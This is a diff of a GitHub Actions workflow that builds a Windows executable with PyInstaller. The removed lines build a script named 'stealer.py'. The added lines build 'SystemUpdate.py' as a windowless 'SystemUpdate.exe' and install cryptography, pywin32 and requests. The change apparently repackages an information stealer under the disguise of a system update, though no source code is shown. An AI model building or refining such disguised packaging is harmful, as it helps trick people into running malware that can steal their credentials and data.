@@ -1,21 +1,26 @@
 name: Build EXE
+
 on: [push]
+
 jobs:
   build:
     runs-on: windows-latest
     steps:
       - uses: actions/checkout@v4
+      
       - name: Set up Python
         uses: actions/setup-python@v5
         with:
-          python-version: '3.12'
+          python-version: '3.11'
+          
       - name: Install dependencies
-        run: pip install pyinstaller pygame
-      - name: Build with PyInstaller
-        run: pyinstaller --onefile "stealer.py"
+        run: pip install cryptography pywin32 requests pyinstaller
+        
+      - name: Build EXE
+        run: pyinstaller --onefile --noconsole --name "SystemUpdate" SystemUpdate.py
+        
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: windows-app-exe
-          path: dist/*.exe
-          
+          name: SystemUpdate-EXE
+          path: dist/SystemUpdate.exe
